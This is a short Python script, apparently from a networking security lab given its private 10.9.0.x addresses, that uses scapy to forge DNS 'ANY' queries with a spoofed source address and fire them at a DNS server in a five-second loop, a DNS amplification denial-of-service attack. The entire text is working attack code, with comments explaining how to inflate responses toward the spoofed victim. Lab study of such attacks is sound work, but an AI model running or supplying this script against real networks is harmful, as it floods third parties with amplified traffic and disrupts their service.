from scapy.all import *
import time

# --- Configuration Section ---

target_ip = "10.9.0.53"       # IP address of the DNS server (victim of amplification)
spoofed_client_ip = "10.9.0.5"  # Spoofed IP address of the user (appears as source of request)
domain_to_query = "geeksforgeeks.org"  # Domain used for the DNS ANY query

# --- Constructing the Spoofed DNS Packet ---

# Create a DNS packet with:
# - Spoofed source IP (victim)
# - DNS server as destination
# - UDP layer with random source port and destination port 53
# - DNS query type "ANY" (qtype=255) to maximize response size
spoofed_dns_packet = IP(src=spoofed_client_ip, dst=target_ip) / \
                     UDP(sport=RandShort(), dport=53) / \
                     DNS(rd=1, qd=DNSQR(qname=domain_to_query, qtype=255))

# --- Sending the Packet in a Burst ---

# Continuously send the spoofed packet for 5 seconds
start_time = time.time()
while time.time() - start_time < 5:
    send(spoofed_dns_packet, verbose=0)
